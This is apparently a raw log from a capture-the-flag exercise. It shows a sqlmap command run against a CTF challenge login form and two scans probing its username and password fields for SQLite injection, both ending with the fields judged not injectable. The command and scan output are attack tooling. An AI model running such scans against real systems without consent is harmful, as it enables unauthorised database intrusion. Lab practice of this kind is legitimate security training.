```
sqlmap -u "http://sqli-1.web-server.challs.ctf.shellmates.club/" --data="username=admin&password=admin" --method POST --dbs 
```

```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.10#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:01:58 /2022-12-26/

[02:01:59] [INFO] testing connection to the target URL
[02:01:59] [INFO] checking if the target is protected by some kind of WAF/IPS
[02:01:59] [INFO] testing if the target URL content is stable
[02:01:59] [INFO] target URL content is stable
[02:01:59] [INFO] testing if POST parameter 'username' is dynamic
[02:02:00] [WARNING] POST parameter 'username' does not appear to be dynamic
[02:02:00] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'SQLite')
[02:02:00] [INFO] testing for SQL injection on POST parameter 'username'
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (1) and risk (1) values? [Y/n] Y
[02:02:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:02:19] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[02:02:19] [INFO] testing 'Generic inline queries'
[02:02:19] [INFO] testing 'SQLite inline queries'
[02:02:20] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[02:02:20] [WARNING] time-based comparison requires larger statistical model, please wait............. (done)                                                                                                                               
[02:02:23] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[02:02:23] [WARNING] there is a possibility that the target (or WAF/IPS) is resetting 'suspicious' requests
[02:02:23] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[02:02:23] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')

```

```

[*] starting @ 12:23:25 /2022-12-26/

[12:23:26] [INFO] testing connection to the target URL
[12:23:26] [INFO] testing if the target URL content is stable
[12:23:26] [INFO] target URL content is stable
[12:23:26] [INFO] testing if POST parameter 'username' is dynamic
[12:23:26] [WARNING] POST parameter 'username' does not appear to be dynamic
[12:23:26] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'SQLite')
[12:23:27] [INFO] testing for SQL injection on POST parameter 'username'
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (1) and risk (1) values? [Y/n] Y
[12:23:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:23:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:23:34] [INFO] testing 'Generic inline queries'
[12:23:34] [INFO] testing 'SQLite inline queries'
[12:23:34] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[12:23:34] [WARNING] time-based comparison requires larger statistical model, please wait............. (done)                                                                                                                               
[12:23:37] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[12:23:37] [WARNING] there is a possibility that the target (or WAF/IPS) is resetting 'suspicious' requests
[12:23:37] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:23:37] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] y
[12:23:46] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[12:24:09] [INFO] POST parameter 'username' appears to be 'SQLite > 2.0 stacked queries (heavy query)' injectable 
[12:24:09] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[12:24:09] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:24:09] [CRITICAL] connection reset to the target URL
[12:24:09] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:24:10] [CRITICAL] connection reset to the target URL
[12:24:10] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
[12:24:10] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:24:10] [CRITICAL] connection reset to the target URL
[12:24:10] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:24:11] [CRITICAL] connection reset to the target URL
[12:24:11] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
[12:24:11] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:24:11] [CRITICAL] connection reset to the target URL
[12:24:11] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
[12:24:11] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:24:12] [CRITICAL] connection reset to the target URL
[12:24:12] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
[12:24:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:24:12] [INFO] checking if the injection point on POST parameter 'username' is a false positive
[12:24:13] [WARNING] false positive or unexploitable injection point detected
[12:24:13] [WARNING] POST parameter 'username' does not seem to be injectable
[12:24:13] [INFO] testing if POST parameter 'password' is dynamic
[12:24:14] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:24:14] [CRITICAL] connection reset to the target URL
[12:24:14] [WARNING] POST parameter 'password' does not appear to be dynamic
[12:24:14] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:24:15] [CRITICAL] connection reset to the target URL
[12:24:15] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[12:24:15] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:24:15] [CRITICAL] connection reset to the target URL
[12:24:15] [INFO] testing for SQL injection on POST parameter 'password'
[12:24:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:24:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:24:21] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:24:21] [CRITICAL] connection reset to the target URL
[12:24:21] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:24:21] [CRITICAL] connection reset to the target URL
[12:24:21] [INFO] testing 'Generic inline queries'
[12:24:22] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:24:22] [CRITICAL] connection reset to the target URL
[12:24:22] [INFO] testing 'SQLite inline queries'
[12:24:22] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:24:23] [CRITICAL] connection reset to the target URL
[12:24:23] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[12:24:23] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:24:23] [CRITICAL] connection reset to the target URL
[12:24:23] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[12:24:38] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[12:24:55] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
[12:25:10] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
[12:25:10] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:25:11] [CRITICAL] connection reset to the target URL
[12:25:11] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
[12:25:11] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[12:25:11] [CRITICAL] connection reset to the target URL
[12:25:11] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[12:25:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:25:35] [WARNING] POST parameter 'password' does not seem to be injectable
[12:25:35] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 12:25:35 /2022-12-26/

```